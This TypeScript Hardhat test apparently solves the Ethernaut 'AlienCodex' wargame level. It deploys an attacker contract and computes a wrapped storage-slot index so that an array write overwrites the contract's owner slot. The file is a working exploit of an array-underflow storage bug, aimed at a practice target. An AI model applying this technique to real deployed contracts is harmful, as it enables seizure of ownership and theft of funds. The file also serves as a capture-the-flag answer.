import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`AlienCodex`);
  // The below address comes from Ethernaut deployed on Rinkeby
  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
  // from the URL
  const challengeAddress = await createChallenge(
    `0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // Update this to match your attack contract
  const attackerFactory = await ethers.getContractFactory(`AlienCodexAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    // This will set the contacted() modifier to return true which we need to access other functions
    // The array is the second variable in the target contract so it should be stored
    // at keccak('0x00...001`);
    // https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#converting-array-indices-to-addresses
    console.log('EOA address: ' + await accounts[0].getAddress());
    const firstSlotAddress = await ethers.utils.keccak256(
        ethers.utils.hexZeroPad(
            ethers.BigNumber.from(1).toHexString(),
            32
        )
    )
    console.log('Array start address: ' + firstSlotAddress);
    // Calculated by:
    // perl -Mbigint -E 'say ((2**256 - ARRAY_ADDRESS)->as_hex)'
    // https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#converting-array-indices-to-addresses
    const targetSlotAddress = `0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a`;
    console.log('Desired destination address: ' + targetSlotAddress);
    // NOTE: An attacker contract isn't actually necessary to solve this but I don't
    // feel motivated to rework this into a TypeScript-only solution.
    await attacker.attack(
        ethers.utils.hexZeroPad(await accounts[0].getAddress(), 32),
        targetSlotAddress
    );
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
